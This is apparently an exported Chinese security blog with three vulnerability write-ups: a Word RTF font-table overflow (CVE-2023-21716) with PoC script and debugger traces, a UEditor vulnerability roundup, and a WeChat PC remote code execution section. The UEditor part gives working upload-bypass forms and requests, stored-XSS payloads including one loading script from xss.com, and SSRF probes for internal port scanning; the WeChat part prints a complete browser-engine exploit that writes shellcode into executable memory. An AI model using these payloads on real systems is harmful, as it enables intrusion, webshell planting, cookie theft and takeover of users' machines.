Word的RTF解析器（wwlib）中，是一个远程代码执行漏洞，攻击者可以制作包含过多字体表项的RTF文件，并诱导用户打开来利用此漏洞。攻击者可利用多种方式诱导用户下载并打开特制文档，如电子邮件、即时消息等等。用户使用预览窗格也会触发此漏洞。成功利用此漏洞可能在目标系统上以该用户权限执行代码。 近日漏洞发现者 Joshua J. Drake 公布了漏洞的 POC。 参考链接： https://qoop.org/publications/cve-2023-21716-rtf-fonttbl.md ","date":"0001-01-01","objectID":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/:1:0","tags":null,"title":"","uri":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/"},{"categories":null,"content":"分析环境 Windows 10 x64 1607 Office 2016，Windbg，IDA Pro 7.5 wwlib(16.0.4266.1003) ","date":"0001-01-01","objectID":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/:2:0","tags":null,"title":"","uri":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/"},{"categories":null,"content":"漏洞复现 POC.rtf 使用 Joshua J. Drake 提供的 python 脚本生成。 import sys open(\"t3zt.rtf\",\"wb\").write((\"{\\\\rtf1{\\n{\\\\fonttbl\" + \"\".join([ (\"{\\\\f%dA;}\\n\" % i) for i in range(0,32761) ]) + \"}\\n{\\\\rtlch no crash??}\\n}}\\n\").encode('utf-8')) POC.rtf 的内容较为简单，仅包括 \\rtfN、\\fonttbl、\\fN 和 \\rtlch 控制字，此次漏洞发生在 rtf 解释器 wwlib 模块处理 \\fonttbl 和 \\fN 控制字时，POC.rtf 内容如下。 {\\rtf1{ {\\fonttbl{\\f0A;} {\\f1A;} {\\f2A;} {\\f3A;} {\\f4A;} {\\f5A;} {\\f6A;} ... {\\f32755A;} {\\f32756A;} {\\f32757A;} {\\f32758A;} {\\f32759A;} {\\f32760A;} } {\\rtlch no crash??} }} 对 winword.exe 开启页堆，可以得到以下的栈回溯。 (c70.dc): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=006f23ac ebx=00000001 ecx=000004e4 edx=ffff7ffc esi=362ceff0 edi=00008002 eip=6abb00d5 esp=006f2304 ebp=006f2310 iopl=0 nv up ei pl nz na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206 wwlib!PTLS7::FsUpdateFinitePage+0x7635a: 6abb00d5 66894c5604 mov word ptr [esi+edx*2+4],cx ds:002b:362befec=???? 0:000\u003e kv # ChildEBP RetAddr Args to Child WARNING: Stack unwind information not available. Following frames may be wrong. 00 006f2310 6abaa3ef 17da1268 00007ff8 006f238c wwlib!PTLS7::FsUpdateFinitePage+0x7635a 01 006f51e8 6aba651c 17da1230 006f555c 0005d400 wwlib!PTLS7::FsUpdateFinitePage+0x70674 02 006f579c 6aef05ac 17da1230 006f57dc 00000070 wwlib!PTLS7::FsUpdateFinitePage+0x6c7a1 03 006f5bec 6aeeffb5 0000000b 17da1230 17da1264 wwlib!PTLS7::LsDestroyContext+0x246427 04 006f5e40 6aa4a593 0000000b 04012000 40280000 wwlib!PTLS7::LsDestroyContext+0x245e30 05 006f772c 6a9068ef 0000000b 00000000 04012000 wwlib!PTLS7::FsUpdateBottomlessPage+0x17494 06 006f7c54 6aa654ed 006f8530 00000001 00000000 wwlib!PTLS7::LsAssert+0x2bd1c 07 006f905c 6aa63d3b 006f93f0 006f93e8 04012000 wwlib!PTLS7::FsUpdateBottomlessPage+0x323ee 08 006f90e0 6b56be52 006f93f0 006f93e8 04012000 wwlib!PTLS7::FsUpdateBottomlessPage+0x30c3c 09 006fa66c 6ae6013a 006fa6c8 00000824 00000000 wwlib!wdGetApplicationObject+0xdf8a0 0a 006fb718 6aca4e9e 006ff990 ffffffff 00000001 wwlib!PTLS7::LsDestroyContext+0x1b5fb5 0b 006fb948 6a8ceb47 7668a200 6a8c0000 00000001 wwlib!PTLS7::LsQueryLineUp+0x41cf1 0c 006fb978 6a8ce971 0000000a 00430022 005c003a wwlib!FMain+0x273 0d 006ff9fc 6a8ce906 0000000a 6a8ce8d4 006ffa30 wwlib!FMain+0x9d 0e 006ffa0c 00141762 00140000 00000000 02fbefd4 wwlib!FMain+0x32 0f 006ffa30 00141194 00140000 00000000 02fbefd4 winword+0x1762 10 006ffa7c 766862c4 0045c000 766862a0 1455d81a winword+0x1194 11 006ffa90 77ed0609 0045c000 6d907d52 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo]) 12 006ffad8 77ed05d4 ffffffff 77ef2523 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [SEH]) 13 006ffae8 00000000 00141000 0045c000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 通过栈回溯得到以下调用链，由于没有 wwlib.dll 模块的符号只简单的揣测了一下几个关键函数的作用。 ","date":"0001-01-01","objectID":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/:3:0","tags":null,"title":"","uri":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/"},{"categories":null,"content":"漏洞分析 查看 crash func(sub_102F0020) 及崩溃地址处的上下文，经过一番调试摸清了 sub_102F0020 函数的参数意义和崩溃原因。 sub_102F0020 函数用于处理 fond id 也就是 /fN 中的 N，其会将 fond id 和 codepage value 存储在一个由 Cum 和 Base 计算偏移的地址上。Base 的初始值是 0xa，且每当处理了 0xa 个 fond id 就会累加 0xa。 存储 fond id 和 codepage value 的代码片段同时也是 crash 时的上下文。 .text:102F00A2 movsx eax, word ptr [esi]//获得 Cum .text:102F00A5 mov ecx, [ebp+arg_4]//获得 fond id .text:102F00A8 mov [esi+eax*2+4], cx//存储 fond id \u003c---- bp1 .text:102F00AD movsx eax, word ptr [esi+2] .text:102F00B1 movsx ecx, word ptr [esi] .text:102F00B4 add ecx, eax .text:102F00B6 mov eax, [ebp+arg_8] .text:102F00B9 mov ax, [eax] .text:102F00BC mov [esi+ecx*2+4], ax .text:102F00C1 mov eax, [ebp+arg_10] .text:102F00C4 test eax, eax .text:102F00C6 jz short loc_102F00DA .text:102F00C8 movsx ecx, word ptr [esi]//获得 Cum .text:102F00CB movsx edx, word ptr [esi+2]//获得 Base \u003c---- bp2 .text:102F00CF lea edx, [ecx+edx*2]//计算偏移 \u003c---- bp3 .text:102F00D2 mov cx, [eax]//获得 codepage value .text:102F00D5 mov [esi+edx*2+4], cx//存储 codepage value \u003c---- bp4 \u003c- crash .text:102F00DA inc word ptr [esi]//增加 Cum 计数 在上述代码片段中下 4 个断点查看存储过程，注意各寄存器对应关系。 bp wwlib+2F00A8 \".printf \\\" Cum: %p Font id: %p Target addr: %p from 0x%x + 0x%x*2 + 4\\\\n \\\", eax,ecx,(esi+eax*2+4),esi,eax; gc\" bp wwlib+2F00CB \".printf \\\" Base: %p \\\\n \\\", poi(esi+2); gc\" bp wwlib+2F00CF \".printf \\\" Edx: %p from 0x%x + 0x%x*2\\\\n \\\", (ecx + edx*2),ecx,edx; gc\" bp wwlib+2F00D5 \".printf \\\" Target addr: %p from 0x%x + 0x%x*2 + 4\\\\n \\\", (esi+edx*2+4),esi,edx; gc\" 崩溃前断点记录到的存储过程信息。 ... --------------------------------------------------------------------------------------- Cum: 00007fec Font id: 00007fec Target addr: 3b3e0044 from 0x3b3d0068 + 0x7fec*2 + 4 Base: 00007fee Edx: 00017fc8 from 0x7fec + 0x7fee*2 Target addr: 3b3ffffc from 0x3b3d0068 + 0x17fc8*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007fed Font id: 00007fed Target addr: 3b3e0046 from 0x3b3d0068 + 0x7fed*2 + 4 Base: 00007fee Edx: 00017fc9 from 0x7fed + 0x7fee*2 Target addr: 3b3ffffe from 0x3b3d0068 + 0x17fc9*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007fee Font id: 00007fee Target addr: 3e538008 from 0x3e528028 + 0x7fee*2 + 4 Base: 00007ff8 Edx: 00017fde from 0x7fee + 0x7ff8*2 Target addr: 3e557fe8 from 0x3e528028 + 0x17fde*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007fef Font id: 00007fef Target addr: 3e53800a from 0x3e528028 + 0x7fef*2 + 4 Base: 00007ff8 Edx: 00017fdf from 0x7fef + 0x7ff8*2 Target addr: 3e557fea from 0x3e528028 + 0x17fdf*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007ff0 Font id: 00007ff0 Target addr: 3e53800c from 0x3e528028 + 0x7ff0*2 + 4 Base: 00007ff8 Edx: 00017fe0 from 0x7ff0 + 0x7ff8*2 Target addr: 3e557fec from 0x3e528028 + 0x17fe0*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007ff1 Font id: 00007ff1 Target addr: 3e53800e from 0x3e528028 + 0x7ff1*2 + 4 Base: 00007ff8 Edx: 00017fe1 from 0x7ff1 + 0x7ff8*2 Target addr: 3e557fee from 0x3e528028 + 0x17fe1*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007ff2 Font id: 00007ff2 Target addr: 3e538010 from 0x3e528028 + 0x7ff2*2 + 4 Base: 00007ff8 Edx: 00017fe2 from 0x7ff2 + 0x7ff8*2 Target addr: 3e557ff0 from 0x3e528028 + 0x17fe2*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007ff3 Font id: 00007ff3 Target addr: 3e538012 from 0x3e528028 + 0x7ff3*2 + 4 Base: 00007ff8 Edx: 00017fe3 from 0x7ff3 + 0x7ff8*2 Target addr: 3e557ff2 from 0x3e528028 + 0x17fe3*2 + 4 --------------------------------------------------------------------------------------- Cum: 00007ff4 Font id: 00007ff4 Target addr: 3e538014 from 0x3e528028 + 0x7ff4*2 + 4 Base: 00007ff8 Edx: 00017fe4 from 0x7ff4 + 0x7ff8*2 Target addr: 3e557ff4 from 0x","date":"0001-01-01","objectID":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/:4:0","tags":null,"title":"","uri":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/"},{"categories":null,"content":"补丁分析 将 Office 更新到最新后再次打开 POC.rtf 发现依然会造成崩溃，不过此崩溃是 winword.exe 提前检测到即将造成堆损坏而主动引发的，另外发现微软提供了此版本 wwlib.dll 的符号文件，此栈回溯与之前的基本一致。 (174c.149c): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!) eax=00008002 ebx=00007ff8 ecx=00000005 edx=ffffffff esi=7e221028 edi=00007ff8 eip=6cccec57 esp=004f10f4 ebp=004f110c iopl=0 nv up ei pl nz ac pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000216 wwlib!FSearchFtcmap+0x182: 6cccec57 cd29 int 29h 0:000\u003e kv # ChildEBP RetAddr Args to Child 00 004f110c 6d9f1494 004f119c 00000001 004f1188 wwlib!FSearchFtcmap+0x182 (FPO: [Non-Fpo]) 01 004f35d8 6d9e347e bb594bde 1c597028 0005d400 wwlib!RtfInRare+0x1848 (FPO: [Non-Fpo]) 02 004f3a0c 6d9ff40f 00000070 1c597028 505daa50 wwlib!CchRtfInCore+0x28df (FPO: [Non-Fpo]) 03 004f3c5c 6d9fecc4 1c59702c 004fa0d0 004f5a60 wwlib!RtfGetChars+0x183 (FPO: [Non-Fpo]) 04 004f3ca8 6c97a74a 40280000 00200002 56b28f10 wwlib!PdodCreateRtf+0x177 (FPO: [6,13,4]) 05 004f5404 6c528610 04012000 20280000 00200002 wwlib!`Mso::Details::SharedMutexPool::Get'::`2'::`dynamic atexit destructor for 's_mutexPool''+0x15be8d 06 004f5758 6c52829b 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x33a (FPO: [Non-Fpo]) 07 004f57dc 6c504161 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4]) 08 004f8df4 6c5001b5 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0x22eb (FPO: [Non-Fpo]) 09 004f8ebc 6d2d3628 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0]) 0a 004f9fe8 6d2d332e 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2e7 (FPO: [Non-Fpo]) 0b 004fa024 6c7b525d 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0]) 0c 004fb4c4 6c3cc272 00000001 00000000 6c3cc22c wwlib!IfrInitArgs+0x7ef (FPO: [Non-Fpo]) 0d 004fb6fc 6c309720 bb59c6ba 74cda210 0000000a wwlib!Boot::IfrParseCommandLine2+0x46 (FPO: [Non-Fpo]) 0e 004fb774 6c309542 004fb7a4 6c300000 6c309234 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo]) 0f 004ff830 6c309298 83385031 00000540 bb5989b6 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo]) 10 004ff864 00941917 00940000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo]) 11 004ffab4 0094114a 00940000 00000000 0077efd4 winword!WinMain+0x146 (FPO: [Non-Fpo]) 12 004ffb00 74cd62c4 003e5000 74cd62a0 454ba229 winword!std::_Deallocate\u003c8,0\u003e+0x1e3 (FPO: [Non-Fpo]) 13 004ffb14 77ae0fa9 003e5000 11605f5b 00000000 KERNEL32!BaseThreadInitThunk+0x24 (FPO: [Non-Fpo]) 14 004ffb5c 77ae0f74 ffffffff 77b02ed1 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [SEH]) 15 004ffb6c 00000000 00941000 003e5000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 补丁文件中新增的范围检测。 ","date":"0001-01-01","objectID":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/:5:0","tags":null,"title":"","uri":"/microsoft-word-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-21716/"},{"categories":null,"content":"Ueditor编辑器漏洞总结 ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:0:0","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"漏洞描述 UEditor 是由百度「FEX前端研发团队」开发的所见即所得富文本web编辑器，具有轻量，可定制，注重用户体验等特点，开源基于MIT协议，允许自由使用和修改代码。 界面如下： ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:1:0","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:2:0","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"0x01 文件读取漏洞 file 目录文件读取： http://www.xxxx.com/net/controller.ashx?action=listfile image 目录文件读取： http://www.xxxx.com/ueditor/net/controller.ashx?action=listimage ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:2:1","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"0x02 .net版本 任意文件上传 只适用于 .net 版本，存在于1.4.3.3、1.5.0和1.3.6版本中。 准备一台服务区存放图片马或者需要上传的文件，本地构造一个 html 页面用于上传使用 \u003cform action=\"http://www.xxxx.com/ueditor/net/controller.ashx?action=catchimage\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\"\u003e \u003cp\u003eshell addr: \u003cinput type=\"text\" name=\"source[]\" /\u003e\u003c/p\u003e \u003cinput type=\"submit\" value=\"Submit\" /\u003e \u003c/form\u003e shell addr 处填写服务器上图片码地址，构造成以下格式，绕过上传使其解析为 aspx http://xxxx/1.gif?.aspx 成功上传返回上传路径，可直连 getshell ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:2:2","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"0x03 php版本文件上传 poc： POST http://localhost/ueditor/php/action_upload.php?action=uploadimage\u0026CONFIG[imagePathFormat]=ueditor/php/upload/fuck\u0026CONFIG[imageMaxSize]=9999999\u0026CONFIG[imageAllowFiles][]=.php\u0026CONFIG[imageFieldName]=fuck HTTP/1.1 Host: localhost Connection: keep-alive Content-Length: 222 Cache-Control: max-age=0 Origin: null Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/60.0.3112.78 Safari/537.36 Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryDMmqvK6b3ncX4xxA Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4 ———WebKitFormBoundaryDMmqvK6b3ncX4xxA Content-Disposition: form-data; name=\"fuck\"; filename=\"fuck.php\" Content-Type: application/octet-stream \u003c?php phpinfo(); ?\u003e ———WebKitFormBoundaryDMmqvK6b3ncX4xxA— shell路径由CONFIG[imagePathFormat]=ueditor/php/upload/fuck决定 http://localhost/ueditor/php/upload/fuck.php ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:2:3","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"0x03 存储型xss \u003chtml\u003e \u003chead\u003e\u003c/head\u003e \u003cbody\u003e \u003csomething:script xmlns:something=\"http://www.w3.org/1999/xhtml\"\u003ealert(1)\u003c/something:script\u003e \u003c/body\u003e \u003c/html\u003e 盲打 Cookie、src=\"\"： \u003csomething:script src=\"\" xmlns:something=\"http://www.w3.org/1999/xhtml\"\u003e\u003c/something:script\u003e 上传点： /ueditor/index.html /ueditor/asp/controller.asp?action=uploadimage /ueditor/asp/controller.asp?action=uploadfile /ueditor/net/controller.ashx?action=uploadimage /ueditor/net/controller.ashx?action=uploadfile /ueditor/php/controller.php?action=uploadfile /ueditor/php/controller.php?action=uploadimage /ueditor/jsp/controller.jsp?action=uploadfile /ueditor/jsp/controller.jsp?action=uploadimage 将uploadimage类型改为uploadfile，修改文件后缀名为.xml： 上传成功，访问成功弹框： 一些常见的xml弹窗poc 弹窗xss： \u003chtml\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003e\u003csomething:script xmlns:something=\"http://www.w3.org/1999/xhtml\"\u003ealert(1);\u003c/something:script\u003e\u003c/body\u003e\u003c/html\u003e url跳转： \u003chtml\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003e\u003csomething:script xmlns:something=\"http://www.w3.org/1999/xhtml\"\u003ewindow.location.href=\"https://www.t00ls.net/\";\u003c/something:script\u003e\u003c/body\u003e\u003c/html\u003e 远程加载js： \u003chtml\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003e\u003csomething:script src=\"http://xss.com/xss.js\" xmlns:something=\"http://www.w3.org/1999/xhtml\"\u003e\u003c/something:script\u003e\u003c/body\u003e\u003c/html\u003e ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:2:4","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"0x04 ssrf 该漏洞存在于1.4.3的jsp版本中，1.4.3.1版本已经修复。 该版本ueditor的ssrf触发点： /jsp/controller.jsp?action=catchimage\u0026source[]= /jsp/getRemoteImage.jsp?upfile= /php/controller.php?action=catchimage\u0026source[]= 使用百度logo构造poc： http://xxx/cmd/ueditor/jsp/controller.jsp?action=catchimage\u0026source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png 内网端口探测： /ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg /ueditor/jsp/controller.jsp?action=catchimage\u0026source[]=https://www.baidu.com/img/baidu_jgylogo3.gif /ueditor/php/controller.php?action=catchimage\u0026source[]=https://www.baidu.com/img/baidu_jgylogo3.gif 判断该地址对应的主机端口是否开放： 如果抓取不存在的图片地址时，页面返回如下，即state为\"远程连接出错\"。 {\"state\": \"SUCCESS\", list:[{\"state\":\"\\u8fdc\\u7a0b\\u8fde\\u63a5\\u51fa\\u9519\"} ]} 如果成功抓取到图片，页面返回如下，即state为\"SUCCESS\"。 {\"state\": \"SUCCESS\", list: [{\"state\":\"SUCCESS\",\"size\":\"5103\",\"source\":\"http://192.168.135.133:8080/tomcat.png\",\"title\":\"1527173588127099881.png\",\"url\":\"/ueditor/jsp/upload/image/20180524/1527173588127099881.png\"}]} 如果主机无法访问，页面返回如下，即state为\"抓取远程图片失败\"。 {\"state\":\"SUCCESS\", list: [{\"state\":\"\\u6293\\u53d6\\u8fdc\\u7a0b\\u56fe\\u7247\\u5931\\u8d25\"}]} 还有一个版本的ssrf漏洞 ，存在于onethink 1.0中的ueditor，测试版本为1.2。poc： POST http://xxx/Public/static/ueditor/php/getRemoteImage.php HTTP/1.1 Host: xxx User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 37 Connection: keep-alive upfile=https://www.google.com/?%23.jpg ","date":"0001-01-01","objectID":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/:2:5","tags":null,"title":"","uri":"/ueditor%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"categories":null,"content":"微信客户端 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 微信客户端存在远程命令执行漏洞。目前已经发现在野利用，受害者点击链接就会中招，微信Windows PC版进程webchatweb.exe会加载shellcode执行，整个过程无文件落地，无新进程产生，攻击者可以直接获取目标机器权限。 参考链接： https://mp.weixin.qq.com/s/OfPNr-l_9kzl1MdE7DSHHQ ","date":"0001-01-01","objectID":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 微信Windows版 \u003c=3.2.1.141 截止2022年12月最新版为3.8.0.41 ","date":"0001-01-01","objectID":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%BE%AE%E4%BF%A1%E5%AE%A2%E6%88%B7%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 安恒信息应急响应中心 分析的攻击链： 攻击者利用微信（PC版）0day构造恶意的钓鱼链接，通过微信将钓鱼链接发送给目标员工。 当员工打开攻击者的钓鱼链接时触发该漏洞，从而导致目标员工PC被植入攻击者制作的cobalstrike木马，木马进程为：xxxsoft.exe，同时创建了名为dotnet_v4.3的系统服务。 随后，攻击者进一步在c:\\ProgramData\\目录下放置TxPortMap.exe 扫描工具并利用该工具扫描目标单位内网。 exploit.js： ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [#shellcode];//shellcode替换成自己的 注意是x86的 function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i \u003c 0x10000; ++i) { target_function(i); } var g_array; var tDerivedNCount = 17 * 87481 - 8; var tDerivedNDepth = 19 * 19; function cb(flag) { if (flag == true) { return; } g_array = new Array(0); g_array[0] = 0x1dbabe * 2; return 'c01db33f'; } function gc() { for (var i = 0; i \u003c 0x10000; ++i) { new String(); } } function oobAccess() { var this_ = this; this.buffer = null; this.buffer_view = null; this.page_buffer = null; this.page_view = null; this.prevent_opt = []; var kSlotOffset = 0x1f; var kBackingStoreOffset = 0xf; class LeakArrayBuffer extends ArrayBuffer { constructor() { super(0x1000); this.slot = this; } } this.page_buffer = new LeakArrayBuffer(); this.page_view = new DataView(this.page_buffer); new RegExp({ toString: function () { return 'a' } }); cb(true); class DerivedBase extends RegExp { constructor() { // var array = null; super( // at this point, the 4-byte allocation for the JSRegExp `this` object // has just happened. { toString: cb }, 'g' // now the runtime JSRegExp constructor is called, corrupting the // JSArray. ); // this allocation will now directly follow the FixedArray allocation // made for `this.data`, which is where `array.elements` points to. this_.buffer = new ArrayBuffer(0x80); g_array[8] = this_.page_buffer; } } // try{ var derived_n = eval(`(function derived_n(i) { if (i == 0) { return DerivedBase; } class DerivedN extends derived_n(i-1) { constructor() { super(); return; ${\"this.a=0;\".repeat(tDerivedNCount)} } } return DerivedN; })`); gc(); new (derived_n(tDerivedNDepth))(); this.buffer_view = new DataView(this.buffer); this.leakPtr = function (obj) { this.page_buffer.slot = obj; return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt); } this.setPtr = function (addr) { this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt); } this.read32 = function (addr) { this.setPtr(addr); return this.page_view.getUint32(0, true, ...this.prevent_opt); } this.write32 = function (addr, value) { this.setPtr(addr); this.page_view.setUint32(0, value, true, ...this.prevent_opt); } this.write8 = function (addr, value) { this.setPtr(addr); this.page_view.setUint8(0, value, ...this.prevent_opt); } this.setBytes = function (addr, content) { for (var i = 0; i \u003c content.length; i++) { this.write8(addr + i, content[i]); } } return this; } function trigger() { var oob = oobAccess(); var func_ptr = oob.leakPtr(target_function); print('[*] target_function at 0x' + func_ptr.toString(16)); var kCodeInsOffset = 0x1b; var code_addr = oob.read32(func_ptr + kCodeInsOffset); print('[*] code_addr at 0x' + code_addr.toString(16)); oob.setBytes(code_addr, shellcode); target_function(0); } try{ print(\"start running\"); trigger(); }catch(e){ print(e); } 